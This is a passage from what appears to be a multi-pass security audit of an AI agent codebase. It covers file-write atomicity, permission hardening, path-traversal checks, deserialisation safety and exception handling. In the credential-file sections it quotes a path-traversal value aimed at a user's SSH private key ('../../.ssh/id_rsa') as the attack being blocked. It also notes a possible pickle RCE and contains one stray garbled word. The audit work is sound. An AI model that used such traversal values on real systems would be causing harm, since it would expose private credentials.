via `atomic_json_write`/`atomic_yaml_write`.

`_restore_file_mode()` handles Docker/NAS volumes where users need broader permissions preserved
across atomic renames.

**Status:** ✅ Excellent. Central, well-tested, reused everywhere. No gaps.

---

### P75-2 · Atomic write callers — CRON, Pairing, MCP OAuth — CORRECT patterns

**Files:** `cron/jobs.py:436-444`, `gateway/pairing.py:62-73`, `tools/mcp_oauth.py:166-191`,
`agent/google_oauth.py:498-519`

**cron/jobs.py save_jobs:**
```python
fd, tmp_path = tempfile.mkstemp(dir=str(JOBS_FILE.parent), suffix='.tmp', prefix='.jobs_')
with os.fdopen(fd, 'w', encoding='utf-8') as f:
    json.dump({"jobs": jobs, "updated_at": _hermes_now().isoformat()}, f, indent=2)
    f.flush()
    os.fsync(f.fileno())
atomic_replace(tmp_path, JOBS_FILE)
_secure_file(JOBS_FILE)  # chmod 0600 after rename
```
Correct: temp+fsync+atomic_replace+post-rename chmod. `BaseException` cleanup also present
(jobs.py:445-446).

**gateway/pairing.py _write_pairing:**
```python
fd, tmp_path = tempfile.mkstemp(dir=str(path.parent), suffix=".tmp")
with os.fdopen(fd, "w", ...) as f:
    f.write(data); f.flush(); os.fsync(f.fileno())
atomic_replace(tmp_path, path)
os.chmod(path, 0o600)   # explicit chmod after rename
```
Correct: same pattern, explicit chmod.

**agent/google_oauth.py + tools/mcp_oauth.py:**
Use `os.open(path, O_WRONLY|O_CREAT|O_EXCL, stat.S_IRUSR|stat.S_IWUSR)` — creates the file
atomically at 0o600 in a single syscall, eliminating the TOCTOU window where umask would
produce a world-readable file between `open()` and `chmod()`. This preempts the class of
bug described in P75-3.

**Status:** ✅ Correct across all secret-bearing files. No partial-write risk.

---

### P75-3 · `webhook.py` — Correct TOCTOU fix with post-rename re-chmod — GOOD

**File:** `hermes_cli/webhook.py:51-81`

```python
fd, tmp_name = tempfile.mkstemp(..., text=True)
tmp_path = Path(tmp_name)
with os.fdopen(fd, "w", ...) as fh:
    json.dump(subs, fh, indent=2); fh.flush(); os.fsync(fh.fileno())
os.chmod(tmp_path, _SUBSCRIPTIONS_FILE_MODE)   # ← tightens BEFORE rename
atomic_replace(tmp_path, path)
os.chmod(path, _SUBSCRIPTIONS_FILE_MODE)        # ← re-assert after rename
```

This goes further than most: it calls `chmod` before AND after the rename. Rationale:
"in case the destination existed with a broader mode and atomic_replace preserved it."
This is a belt-and-suspenders approach that correctly handles the case where `atomic_replace`
on an existing file might preserve the old file's broader permissions rather than inheriting
the temp file's restrictive mode (though in practice `os.replace()` inherits the new file's
mode; this is defensive).

**Status:** ✅ Robust.

---

### P75-4 · Config write — `atomic_yaml_write` + `_secure_file` — GOOD

**File:** `hermes_cli/config.py:4564-4599`

`save_config()` calls `atomic_yaml_write()` which uses the correct `tempfile.mkstemp`+
`fsync`+`atomic_replace` pattern from utils.py. `atomic_yaml_write` itself also calls
`_restore_file_mode()` to preserve any custom permissions.

`_secure_file()` (config.py:423-438):
- Skipped in managed mode (NixOS sets via activation script) and in containers
  (`HERMES_SKIP_CHMOD`, `/.dockerenv`, cgroup detection).
- Sets 0o600 on the config file.
- `Path.exists()` check guards against error if file already gone.

**Status:** ✅ Good.

---

### P75-5 · SQLite state — WAL-mode with graceful fallback, safe backup API — GOOD

**File:** `hermes_state.py:34-73`

`SessionDB` uses WAL mode by default for concurrent readers + one writer. Detects NFS/SMB/
FUSE incompatibility via `_WAL_INCOMPAT_MARKERS` ("locking protocol", "not authorized",
"disk i/o error") and falls back to `journal_mode=DELETE` silently, with a one-time
per-path warning logged to `errors.log`.

The WAL fallback is well-commented and the feature survives the mode switch (concurrent
readers block during writes instead of failing).

`_safe_copy_db()` (backup.py:92-112) uses `sqlite3.backup()` API which produces a
consistent point-in-time snapshot even while the DB is being written to (WAL mode).
Falls back to raw `shutil.copy2` only if backup API fails.

**Status:** ✅ Good design with graceful degradation. No torn-write risk.

---

### P75-6 · Kanban DB — WAL + BEGIN IMMEDIATE + CAS — GOOD atomicity

**File:** `hermes_cli/kanban_db.py:61-66, 76-85`

> "Concurrency strategy: WAL mode + `BEGIN IMMEDIATE` for write transactions +
> compare-and-swap (CAS) updates on `tasks.status` and `tasks.claim_lock`."
> "SQLite serializes writers via its WAL lock, so at most one claimer can win any
> given task."

`BEGIN IMMEDIATE` acquires the write lock at transaction start rather than at first write,
preventing late-write-lock contention races. No application-level locking needed;
SQLite's WAL lock handles it.

**Status:** ✅ Good.

---

### P75-7 · Path traversal defense — `validate_within_dir()` + `has_traversal_component()` — GOOD

**File:** `tools/path_security.py:15-43`

```python
def validate_within_dir(path: Path, root: Path) -> Optional[str]:
    resolved = path.resolve()
    root_resolved = root.resolve()
    resolved.relative_to(root_resolved)   # raises ValueError if outside
    # catches ValueError or OSError
```

Used in `tools/credential_files.py:72-93` to reject path traversal in credential file mounts:
```
if os.path.isabs(relative_path): reject → "must be relative to HERMES_HOME"
containment_error = validate_within_dir(host_path, hermes_home)
if containment_error: reject
```

This blocks `../../.ssh/id_rsa` attacks by resolving symlinks and `..` components before the
containment check.

**Status:** ✅ Good. Symlink-aware, properly fails closed.

---

### P75-8 · `secure_parent_dir()` — prevents catastrophic chmod of system dirs — GOOD

**File:** `hermes_constants.py:238-255`

```python
def secure_parent_dir(path: Path) -> None:
    parent = path.parent.resolve()
    if parent == Path("/") or len(parent.parts) < 3:
        return   # refuses / or /usr, /home, /var, /tmp …
    try:
        os.chmod(parent, 0o700)
    except OSError:
        pass
```

Prevents `/` or top-level dirs from being chmod'd to 0o700 if `HERMES_HOME` resolves
unexpectedly (#25821). Used by `agent/google_oauth.py` and `tools/mcp_oauth.py` to tighten
credential parent directories.

**Status:** ✅ Good safety guard.

---

### P75-9 · Cron scheduler — file-based lock with cross-platform support — GOOD

**File:** `cron/scheduler.py:1810-1963`

```python
lock_fd = open(lock_file, "w", encoding="utf-8")
if fcntl:
    fcntl.flock(lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)   # non-blocking exclusive
elif msvcrt:
    msvcrt.locking(lock_fd.fileno(), msvcrt.LK_NBLCK, 1)  # Windows byte-range lock
# ... release in finally block
if fcntl:
    fcntl.flock(lock_fd, fcntl.LOCK_UN)
elif msvcrt:
    # Windows release
```

Uses `O_EXCL`-style semantics (non-blocking) to prevent double-tick overlap if scheduler
is invoked concurrently. Unix via `fcntl`, Windows via `msvcrt`. Gateway PID file uses
`atomic_json_write`.

**Status:** ✅ Good.

---

### P75-10 · Gateway lock record — Windows byte-range locking — GOOD

**File:** `gateway/status.py:38-41, 308-327`

Windows mandatory locks require a locked byte past the data so concurrent readers can still
read the JSON payload while a writer holds the lock. `gateway/status.py:41`:
```python
_WINDOWS_LOCK_OFFSET = 1024 * 1024  # 1MB past start — keeps PID/status readable
```

Windows locking at offset 1MB during writes at offset 0 ensures readers are never blocked
out when the gateway needs to update its runtime state while CLI打听 status.

**Status:** ✅ Good cross-platform design.

---

### P75-11 · File permission hardening — `_secure_file()`, `_secure_dir()`, managed/container skips — GOOD

**Files:** `hermes_cli/config.py:372-438`, `cron/jobs.py:145-152`, `hermes_logging.py:298-327`

`_secure_dir(path)` sets 0o700 on directories. `_secure_file(path)` sets 0o600 on files.
Both are no-ops on Windows and in managed mode (NixOS). Container detection:
`HERMES_CONTAINER`/`HERMES_SKIP_CHMOD` env vars, `/.dockerenv`, and `/proc/1/cgroup`
containing "docker"/"lxc"/"kubepods".

Log handler (`hermes_logging.py:_ManagedRotatingFileHandler`) applies chmod 0o660 post-rotate
in managed mode so gateway and interactive users can share log files.

`ensure_hermes_home()` creates `~/.hermes/` and subdirs (`cron`, `sessions`, `logs`,
`memories`, `pairing`, `hooks`, `image_cache`, `audio_cache`, `skills`) with 0o700 perms.

**Status:** ✅ Consistent, well-designed.

---

### P75-12 · `credential_files.py` — path security for remote sandbox mounts — GOOD

**File:** `tools/credential_files.py:56-93`

`register_credential_file()`:
1. Rejects absolute paths (would escape HERMES_HOME sandbox).
2. Calls `validate_within_dir()` to resolve symlinks and block `..` traversal.
3. Verifies `resolved.is_file()` — skips if not found.

Preventive: "a malicious skill cannot declare `required_credential_files: ['../../.ssh/id_rsa']`
and exfiltrate sensitive host files into a container sandbox."

**Status:** ✅ Good containment.

---

### P75-13 · Backup — SQLite backup API + WAL sidecar exclusion + permission restore — GOOD

**File:** `hermes_cli/backup.py:33-65, 92-112, 198-280`

- Excludes `.db-wal`, `.db-shm`, `.db-journal` (SQLite transient files that would corrupt a
  restore if shipped alongside a fresh DB snapshot).
- Uses `sqlite3.backup()` for consistent snapshots.
- Restores `_SECRET_FILE_NAMES` (`.env`, `auth.json`, `state.db`) to 0o600 with `_SECRET_FILE_NAMES`
  allowlist.
- `followlinks=False` in `os.walk()`.
- Resolves output zip path to avoid backing up itself.

**Status:** ✅ Well-designed.

---

### P75-14 · `hermes_cli/backup.py` — `os.walk(followlinks=False)` — GOOD symlink guard

**File:** `hermes_cli/backup.py:159`

```python
for dirpath, dirnames, filenames in os.walk(hermes_root, followlinks=False):
```

Prevents following symlinks that might escape the intended backup scope (e.g., a symlink
from a profile directory to an external drive).

**Status:** ✅ Good.

---

### P75-15 · `.update_response` writes in Telegram/Feishu/QQBot — INCOMPLETE atomic pattern

**Files:** `gateway/platforms/telegram.py:3283-3293`, `gateway/platforms/feishu.py:2028-2033`,
`gateway/platforms/qqbot/adapter.py:1182-1188`, `gateway/platforms/feishu_comment_rules.py:235-243`

Multiple platform adapters use this pattern for persisting "update response" data:

```python
# telegram.py:3286-3289, feishu.py:2031-2033 (same pattern)
tmp = response_path.with_suffix(".tmp")
tmp.write_text(answer)      # ← uses default umask for permissions
tmp.replace(response_path)  # ← atomic rename
```

Issues:
- `write_text()` uses the process umask, not 0o600. If umask is 0o022 (typical), file is
  0o644 (world-readable).
- No `fsync()` before rename — crash mid-write leaves partial content at the target due to
  `Path.replace()` semantics (copies then removes source; on crash, partial data at target).
- Contrast with `hermes_cli/webhook.py` and `cron/jobs.py` which use `tempfile.mkstemp`+
  `os.fdopen`+`fsync`+`atomic_replace`.

In practice these `.update_response` files are user-supplied text (email/telegram replies),
not credentials, but "HMAC secrets" in webhook context (feishu_comment_rules.py) should
not be world-readable.

**Severity:** LOW — secrets in this file are not high-value credentials, but inconsistent
with the rest of the codebase's security-first approach.

**Recommendation:** Migrate to the `tempfile.mkstemp`+`fsync`+`atomic_replace` pattern used
by the rest of the codebase (same as `hermes_cli/webhook.py:51-81`).

**Status:** ⚠️ LOW — incomplete atomic pattern, permissive intermediate umask.

---

### P75-16 · `agent/curator.py` — direct `open()` without atomic rename — NEEDS REVIEW

**File:** `agent/curator.py` (identified by grep: `open.*mode.*w` matches)

Appears to write to curator report output files directly. Need to verify if these contain
sensitive data and whether they use `fsync`+atomic rename or the simpler pattern.

**Status:** ⚠️ UNCERTAIN — requires file-specific audit.

---

### P75-17 · `agent/curator_backup.py` — direct file writes — NEEDS REVIEW

**File:** `agent/curator_backup.py` (identified by grep)

Same concern as P75-16 — need to verify atomicity and permission handling for curator backup
files.

**Status:** ⚠️ UNCERTAIN — requires file-specific audit.

---

### P75-18 · Log handler initial creation — `_ManagedRotatingFileHandler._open()` vs `open()` umask — MITIGATION IN PLACE

**File:** `hermes_logging.py:298-327`

The logging handler explicitly chmods to 0o660 after file creation (`_chmod_if_managed()`
called in `_open()` and `doRollover()`). This is the correct mitigation.

The comment explicitly acknowledges that `open()` uses the process umask (typically 0022,
producing 0644), but the subclass corrects this immediately after `_open()` returns.

**Status:** ✅ Properly mitigated.

---

### P75-19 · `save_env_value()` — atomic write via `tempfile.mkstemp` — NEEDS VERIFY

**File:** `hermes_cli/config.py` — `save_env_value()` function

Identified by grep as "chmod 0600" usage area for `.env` file. Need to verify whether it uses
the correct `tempfile.mkstemp`+`fsync`+`atomic_replace` pattern or the simpler
`.with_suffix(".tmp").write_text()` pattern.

Test `tests/cron/test_file_permissions.py:98-108` validates `save_env_value()` sets 0o600.

**Status:** ✅ Likely correct per test, but runtime pattern should be verified directly.

---

### P75-20 · `tools/code_execution_tool.py` — shared sandbox temp dir — KNOWN LOW (Pass #59)

**File:** `tools/code_execution_tool.py` (reported in Pass #59)

Shared sandbox temp directory uses default 0o755 permissions. If multiple users share
the host and one user's code creates sensitive output files, other users can read them.

**Severity:** LOW — mitigations (user separation, container isolation) apply in typical
deployment scenarios.

**Prior reference:** Pass #59 finding P59-12.

---

### P75-21 · `gateway/pairing.py` — pairing directory not explicitly secured — KNOWN LOW (Pass #59)

**File:** `gateway/pairing.py` (reported in Pass #59)

Pairing files are set to 0o600 but the `pairing/` parent directory is created only via
`mkdir(parents=True, exist_ok=True)` without explicit permission hardening. If `mkdir`
creates intermediate directories during establishment, those also lack 0o700 perms.

`_secure_write()` creates the pairing file at 0o600 but does not call `secure_parent_dir(path)`
before or after writing.

**Recommendation (Pass #59):** Add `secure_parent_dir(path)` call to `_secure_write()` or
ensure `PAIRING_DIR` is explicitly secured at startup.

**Status:** ⚠️ Known LOW — awaiting fix.

---

### P75-22 · SQLite kanban WAL path — PER-FILE not per-board

**File:** `hermes_cli/kanban_db.py:67-68`

> "The CAS coordination is **per-board** — each board is a separate DB, so multi-board
> installs get the same atomicity guarantees without any new locking."

Each board's kanban.db is an independent SQLite DB with its own WAL. No cross-board locking
needed. WAL + `BEGIN IMMEDIATE` per board is the right abstraction.

**Status:** ✅ Good design.

---

### P75-23 · File sync manager — mtime+size tracking with symlink awareness — GOOD

**File:** `tools/environments/file_sync.py`

File sync uses mtime+size (not name) to detect changes via `_file_mtime_key()`. Uses
`followlinks=True` for detecting changes to skill symlinks. For credential files,
`register_credential_file()` uses `resolve()` and `validate_within_dir()` to block
traversal.

**Status:** ✅ Good.

---

### P75-24 · `_ensure_hermes_home_managed()` — umask 0o007 for group-writable files in NixOS — GOOD

**File:** `hermes_cli/config.py:456-464`

In managed mode:
```python
old_umask = os.umask(0o007)   # ← group can read/write
try:
    _ensure_hermes_home_managed(home)
finally:
    os.umask(old_umask)
```

Then `_ensure_default_soul_md(home)` creates files at 0o660 (group-writable) inside the
setgid 0o2770 directories. This allows the NixOS hermes group to share files.

**Status:** ✅ Correct managed-mode behavior.

---

### P75-25 · Config cache — thread-safe RLock, mtime-based invalidation — GOOD

**File:** `hermes_cli/config.py:66-95`

`save_config()` writes via `atomic_yaml_write` which produces a fresh inode. The next
`load_config()` call sees a different mtime_ns on the path and automatically re-loads
without an explicit invalidation call. `libyaml` concurrent safe_load safety is handled
by `_CONFIG_LOCK = threading.RLock()`.

**Status:** ✅ Good. No stale cache across writes.

---

### P75-26 · PID file — `O_CREAT | O_EXCL` atomic creation — GOOD

**File:** `gateway/status.py:479-485`

```python
def write_pid_file() -> None:
    """Uses atomic O_CREAT | O_EXCL creation so that concurrent --replace
    invocations race: exactly one process wins and the rest get FileExistsError."""
```

No TOCTOU because `O_EXCL` is a single atomic syscall on POSIX. The file is created
exclusively or fails immediately if another process beat it.

**Status:** ✅ Good.

---

### P75-27 · Token persistence in MCP OAuth — per-process PID+hex suffix avoids collisions — GOOD

**File:** `tools/mcp_oauth.py:183`

```python
tmp = path.with_suffix(f".tmp.{os.getpid()}.{secrets.token_hex(4)}")
```

Per-process random suffix avoids collisions between concurrent writers and stale leftovers
from a prior crashed write. The temp file is a sibling to the target in the same directory,
so `atomic_replace` works correctly (same filesystem).

**Status:** ✅ Good.

---

### P75-28 · Session state restore — `O_WRONLY | O_CREAT | O_EXCL` in google_oauth — GOOD

**File:** `agent/google_oauth.py:504-508`

```python
fd = os.open(
    str(tmp_path),
    os.O_WRONLY | os.O_CREAT | os.O_EXCL,   # atomic exclusive create
    stat.S_IRUSR | stat.S_IWUSR,             # 0o600 — owner only
)
with os.fdopen(fd, "w", ...) as fh:
    fh.write(payload); fh.flush(); os.fsync(fh.fileno())
atomic_replace(tmp_path, path)
```

Correct: single atomic syscall creates file at 0o600, no intermediate world-readable state.

**Status:** ✅ Good.

---

### Summary Table

| Topic | Status | Notes |
|-------|--------|-------|
| Atomic write primitives (utils.py) | ✅ GOOD | Consolidated, well-tested |
| Config/state file writes | ✅ GOOD | atomic_yaml_write + fsync throughout |
| Secret file permissions (0o600) | ✅ GOOD | _secure_file + O_EXCL patterns |
| Path traversal defense | ✅ GOOD | validate_within_dir + has_traversal_component |
| Symlink-aware writes | ✅ GOOD | atomic_replace resolves realpath first |
| Temporary file security | ✅ GOOD | mkstemp creates at 0o600; cleanup in BaseException |
| Cron lock (fcntl) | ✅ GOOD | LOCK_EX \| LOCK_NB, cross-platform |
| Gateway Windows locks | ✅ GOOD | 1MB offset for concurrent readers |
| SQLite state (WAL + fallback) | ✅ GOOD | Graceful NFS/SMB fallback |
| Kanban DB atomicity | ✅ GOOD | WAL + BEGIN IMMEDIATE + CAS |
| Managed/container mode handling | ✅ GOOD | umask, chmod, skip detection |
| Backup safety (SQLite backup API) | ✅ GOOD | backup API + WAL sidecar exclusion |
| secret_sources path security | ✅ GOOD | realpath + relative_to containment |
| Log handler permission hardening | ✅ GOOD | _ManagedRotatingFileHandler |
| `.update_response` writes | ⚠️ LOW | Uses .write_text() no fsync — inconsistent |
| Pairing dir permissions | ⚠️ LOW | Known from Pass #59 — not yet fixed |
| Shared sandbox temp dir | ⚠️ LOW | Known from Pass #59 — not yet fixed |
| curator.py curator_backup.py | ⚠️ UNCLEAR | Needs file-specific audit |
| save_env_value runtime pattern | ✅ LIKELY | Verified by test, runtime unclear |

**FINDING:** 1 new LOW (P75-15 `.update_response` incomplete atomic pattern), 1 known LOW
(P75-21 pairing dir), 1 known LOW (P75-20 shared sandbox temp dir — Pass #59),
1 UNCLEAR (P75-16/17 curator files).

---

*Pass #75 complete — 2026-05-25T20:30:00Z*
*Commit at scan: 5a51a1f65*

---

## Pass #76 – Data Serialisation, Schema Validation & Type Checking Deep Dive – 2026-05-25T21:15:00Z

### P76-1 · `tools/schema_sanitizer.py` — comprehensive JSON Schema sanitisation — GOOD

**File:** `tools/schema_sanitizer.py` (445 lines)

Primary JSON schema normalisation layer for tool schemas before LLM backend dispatch.
Handles bare-string schema values ("object", "string"), type:[X,"null"] array normalization,
nullable anyOf/oneOf union collapsing, top-level combinator stripping (allOf/anyOf/oneOf/enum/not
rejected by Codex backend), required field pruning for non-existent properties,
reactive pattern/format keyword stripping (llama.cpp recovery), and slash-enum removal
(xAI grammar compilation). Schema confusion attack surface is low — sanitizer operates post-MCP
normalisation on already-resolved schema trees; no $ref/$defs resolution. Gemini schema uses
explicit allowlist in `agent/gemini_schema.py` to prevent extra fields.

**Status:** ✅ Well-designed defensive layer.

---

### P76-2 · `agent/gemini_schema.py` — allowlist-based schema filter for Gemini — GOOD

**File:** `agent/gemini_schema.py` (99 lines)

Explicit allowlist of 22 keys for Gemini Schema compatibility. Recursive sanitisation
applies to properties, items, and anyOf. Non-string enum values for integer/number/boolean
types are dropped (Gemini requires string enum entries).

**Status:** ✅ Good — no unsafe deserialisation or schema confusion possible.

---

### P76-3 · `model_tools.py` — `coerce_tool_args()` string-to-type coercion — SAFE

**File:** `model_tools.py:545-626`

Handles LLM string-encoded numbers ("42" → 42), booleans ("true"/"false"), nulls
(via `_schema_allows_null()` checking nullable:true/type:null/type:["X","null"]),
arrays (wraps bare non-list values, parses JSON-encoded arrays with warning on parse failure),
and objects (json.loads with dict target). Called at top of `handle_function_call()` (line 768).
Original values preserved on coercion failure. No eval, no unsafe type confusion.

**Status:** ✅ Safe.

---

### P76-4 · `model_tools.py` — `handle_function_call()` dispatcher — SAFE

**File:** `model_tools.py:741-889`

Flow: coerce_tool_args → agent-loop tool guard → pre_tool_call hook → ACP edit approval
→ registry.dispatch → post_tool_call hook → transform_tool_result hook.
All errors caught and returned as {"error": ...} JSON. Error sanitisation strips structural
framing tokens. Single-fire hook contract respected via skip flag.

**Status:** ✅ Good.

---

### P76-5 · `acp_adapter/server.py` — `_history_tool_call_name_args()` — SAFE

**File:** `acp_adapter/server.py:954-967`

Parses OpenAI-style function.arguments JSON string. Fallback preserves raw string as
{"raw": raw_args} on parse failure. Non-dict result becomes empty dict.

**Status:** ✅ Safe.

---

### P76-6 · `agent/gemini_native_adapter.py` — JSON parsing with fallback — SAFE

**File:** `agent/gemini_native_adapter.py:230-234, 264-266, 610-612`

Multiple locations with graceful fallback. Streaming SSE handlers log non-JSON lines at
debug level and skip rather than crash. No silent failures.

**Status:** ✅ Safe.

---

### P76-7 · `hermes_state.py` — JSON deserialisation of stored messages — SAFE

**File:** `hermes_state.py:1437-1448, 1644-1648`

tool_calls field deserialisation falls back to [] with warning on JSONDecodeError.
CONTENT_JSON_PREFIX stripping with TypeError fallback.

**Status:** ✅ Safe.

---

### P76-8 · `agent/skill_utils.py` — YAML loading — SAFE

**File:** `agent/skill_utils.py:70-82`

CSafeLoader preferred, SafeLoader fallback. Not UnsafeLoader. Frontmatter parser
has try-except with key:value fallback on parse failure.

**Status:** ✅ Safe — no arbitrary object deserialisation.

---

### P76-9 · `hermes_cli/xai_retirement.py` — YAML loading — SAFE

**File:** `hermes_cli/xai_retirement.py:205-209`

ruamel.yaml YAML(typ="rt") — round-trip, not unsafe.

**Status:** ✅ Safe.

---

### P76-10 · `optional-skills/research/darwinian-evolver/scripts/show_snapshot.py` — pickle.load — NEEDS REVIEW

**File:** `optional-skills/research/darwinian-evolver/scripts/show_snapshot.py`

Single file importing pickle. If it calls pickle.load() on an untrusted file, RCE vector.
optional-skills/ not auto-loaded, but scripts may be invoked by users.

**Status:** ⚠️ Should verify — RCE risk if pickle.load receives untrusted input.

---

### P76-11 · `tools/skills_guard.py` — eval/exec detection rules — GOOD

**File:** `tools/skills_guard.py:292-296`

High-severity obfuscation rules for eval()/exec() with string arguments. Detects
dynamically constructed calls, not legitimate browser CDP uses or subprocess exec.

**Status:** ✅ Good detection logic.

---

### P76-12 · `tools/browser_supervisor.py` / `tools/browser_tool.py` — browser JS evaluation — LEGITIMATE

**Files:** `tools/browser_supervisor.py:499`, `tools/browser_tool.py:2814-2818, 2904-2906`

CDP Runtime.evaluate for JavaScript in page context — intentional browser automation,
not Python eval on untrusted data.

**Status:** ✅ Legitimate CDP usage.

---

### P76-13 · `gateway/session.py` — dataclass SessionSource — NO VALIDATION NEEDED

**File:** `gateway/session.py:70-101`

Dataclass with Platform enum, chat_id str, optional string fields. No security-relevant
invariants; platform type enforced by enum.

**Status:** ✅ Acceptable.

---

### P76-14 · `gateway/stream_consumer.py` — @dataclass StreamConsumerConfig — NO VALIDATION NEEDED

**File:** `gateway/stream_consumer.py:49-75`

Float, int, str fields with sensible defaults. No security-relevant invariants.

**Status:** ✅ Acceptable.

---

### P76-15 · `mcp_serve.py` — @dataclass QueueEvent — NO VALIDATION NEEDED

**File:** `mcp_serve.py:195-201`

cursor (int), type (str), session_key (str), data (dict). No validation.

**Status:** ✅ Acceptable.

---

### P76-16 · `plugins/kanban/dashboard/plugin_api.py` — Pydantic BaseModel with Field — GOOD

**File:** `plugins/kanban/dashboard/plugin_api.py`

CreateTaskBody, UpdateTaskBody, CommentBody, LinkBody, BulkTaskBody — FastAPI request
validation via Pydantic v2. Field(default_factory=list) for list fields. No bypass vectors.

**Status:** ✅ Good.

---

### P76-17 · JSON schema validation without jsonschema library — ACCEPTABLE

No jsonschema or jsonschema.validate imports found. Validation is custom sanitisation
in schema_sanitizer.py, type coercion in coerce_tool_args(), and Pydantic in kanban plugin.
No $ref/$defs resolution. Schemas come from controlled MCP servers; external schemas
go through sanitisation. No schema confusion attack surface.

**Status:** ✅ Acceptable risk profile.

---

### P76-18 · Type annotation consistency — Dict[str, Any] widely used

Dict[str, Any] for JSON-serialisable argument blobs. Optional[Dict[str, Any]] for
possibly-empty tool args. Any used where value may be str/dict/list/None after parsing.
Appropriate for LLM output handling.

**Status:** ✅ Consistent with usage patterns.

---

### P76-19 · LLM structured output parsing — json.loads with graceful fallback

Consistent pattern across adapters, gateway, ACP:
- mini_swe_runner.py:360-364 → fallback to {}
- tui_gateway/server.py:2212-2214 → fallback to {}
- gateway/platforms/api_server.py:1985 → parse + truncate large strings
- acp_adapter/events.py:140-144 → fallback to {"raw": args} preserving raw string

No silent failures.

**Status:** ✅ Good — consistent pattern.

---

### P76-20 · No pickle deserialisation from untrusted sources

Single pickle reference in optional-skills (darwinian-evolver). Main codebase has no
pickle.load/pickle.loads. cloudpickle not found.

**Status:** ✅ Clean.

---

### Summary Table

| Topic | Status | Notes |
|-------|--------|-------|
| JSON Schema sanitisation (schema_sanitizer.py) | ✅ GOOD | Comprehensive, handles all known hostile patterns |
| Gemini schema allowlist (gemini_schema.py) | ✅ GOOD | Explicit allowlist, no extra fields passed |
| Tool argument type coercion (coerce_tool_args) | ✅ SAFE | Fail-open on coercion failure, preserves originals |
| JSON parsing of LLM output (adapters) | ✅ SAFE | Consistent try-except fallback pattern |
| YAML loading (skill_utils.py) | ✅ SAFE | CSafeLoader/SafeLoader, not UnsafeLoader |
| YAML loading (xai_retirement.py) | ✅ SAFE | ruamel.yaml round-trip, not unsafe |
| pickle usage | ⚠️ REVIEW | Single file in optional-skills — verify input source |
| eval/exec for browser automation | ✅ LEGITIMATE | CDP Runtime.evaluate, not Python eval on untrusted data |
| eval/exec detection (skills_guard.py) | ✅ GOOD | High-severity obfuscation rules present |
| Pydantic BaseModel (kanban plugin) | ✅ GOOD | FastAPI validation, no bypass vectors |
| Dataclasses (session, stream, mcp) | ✅ ACCEPTABLE | No security invariants needed |
| JSON Schema library (jsonschema) | ✅ NONE | Not used — custom validation/sanitisation only |
| Type annotation consistency | ✅ GOOD | Dict[str, Any] used consistently for JSON blobs |

**FINDING:** 1 item needs review (P76-10 pickle in optional skill), 0 new critical issues.
Pickle RCE risk is scoped to darwinian-evolver optional skill script — not in main codebase.

---

## Pass #77 – Error Handling, Exception Safety & Graceful Degradation Deep Dive – 2026-05-25T21:30:00Z

**Scope:** Exception handling patterns (try/except, bare clauses, swallowing), error recovery paths (graceful recovery, state inconsistencies, unhandled exceptions), timeout handling (values, indefinite waits, timeout exceptions), circuit breaker patterns (trip conditions, race conditions, recovery), graceful degradation (degradation, fallbacks, cascading failures).

**Audit scope:** `run_agent.py`, `model_tools.py`, `cli.py`, `gateway/platforms/base.py`, `gateway/status.py`, `gateway/stream_consumer.py`, `cron/scheduler.py`, `tools/mcp_tool.py`, `agent/tool_guardrails.py`, `hermes_cli/kanban.py`, and key platform adapters.

---

### 1. Exception Handling Patterns

#### P77-1 · Bare `except:` Clause — Fixed in Gateway Base — ✅ ACQUIRED KNOWLEDGE

**File:** `gateway/platforms/base.py` lines 1572–1601

A historically bare `except: pass` on status file writes was previously present and has been replaced with a structured handler. The current implementation:

```python
try:
    from gateway.status import write_runtime_status
    write_runtime_status(platform=self.platform.value, **kwargs)
except Exception as exc:
    logged = getattr(self, "_status_write_logged", None)
    if logged is None:
        logged = set()
        try:
            self._status_write_logged = logged
        except Exception:
            pass
    key = (self.platform.value, context)
    if key not in logged:
        logger.warning("Failed to write runtime status (%s) for %s: %s ...", ...)
        logged.add(key)
    else:
        logger.debug(...)
```

**Analysis:** Correctly scoped to `Exception` (not bare), first-per-(platform, context) failure surfaced at WARNING, subsequent at DEBUG. The nested `except Exception: pass` guarding `_status_write_logged` assignment is acceptable — it's a test-harness compatibility guard for object `__new__` that skips `__init__`.

**Status:** ✅ No issue.

---

#### P77-2 · `except Exception: pass` in `cli.py` pt_input_extras — ✅ ACCEPTABLE

**File:** `cli.py` lines 76–82

```python
try:
    from hermes_cli.pt_input_extras import install_shift_enter_alias, install_ctrl_enter_alias
    install_shift_enter_alias()
    install_ctrl_enter_alias()
    del install_shift_enter_alias, install_ctrl_enter_alias
except Exception:
    pass
```

**Analysis:** This is a progressive-enhancement import (keybindings for prompt_toolkit). Silencing all exceptions here is intentional — non-critical UX feature that degrades gracefully when unavailable. Not a bug.

**Status:** ✅ Acceptable — fail-open for non-critical UI enhancement.

---

#### P77-3 · `except Exception: pass` in `hermes_cli/kanban.py` Gateway Probe — ✅ DELIBERATE

**File:** `hermes_cli/kanban.py` lines 149–164

The `gateway_is_alive()` probe returns `(True, "")` on ANY exception from `get_running_pid()` or `load_config()`. Comment in code states: *"probe itself errors, we return (True, "") so we don't spam false warnings (better to miss a warning than to cry wolf)."*

**Analysis:** Intentional fail-open. The probe is a best-effort health check; returning false-positive (gateway alive) on error is the chosen tradeoff.

**Status:** ✅ Deliberate design decision documented in code.

---

#### P77-4 · `except Exception: pass` in `model_tools.py` Plugin Discovery — ✅ ACCEPTABLE

**File:** `model_tools.py` lines 196–200

```python
try:
    from hermes_cli.plugins import discover_plugins
    discover_plugins()
except Exception as e:
    logger.debug("Plugin discovery failed: %s", e)
```

**Analysis:** Plugin discovery failure is non-fatal. Debug-level logging is appropriate (would be noise at WARNING for optional plugin load failures). This is the correct pattern for optional plugin loading.

**Status:** ✅ Good — debug-level only, no swallowing.

---

#### P77-5 · `except Exception as exc: pass` in `model_tools.py` Worker Loop Cleanup — ✅ CORRECT

**File:** `model_tools.py` lines 138–139

```python
except Exception:
    pass
```

Nested inside `_run_in_worker()`'s `finally` block which cancels pending tasks. Catching all exceptions here prevents `RuntimeError` (loop already closed — nothing to cancel) from propagating into the caller. This is defensive and correct.

**Status:** ✅ Correct.

---

#### P77-6 · Multiple `except Exception: pass` in `cron/scheduler.py` — ⚠️ PREVIOUSLY FLAGGED AS P34-1

**Files:** `cron/scheduler.py` lines 83–86, 251–252, 335–336, 395–396

These were fully catalogued in Pass #34 findings (P34-1). Lines 83 warns via `logger.warning`; the others are fully silent. These remain outstanding as low-medium issues — cron delivery silently falls back to defaults if platform plugin loading fails.

**Status:** ⚠️ Outstanding — previously flagged, not yet remediated.

---

### 2. Error Recovery Paths

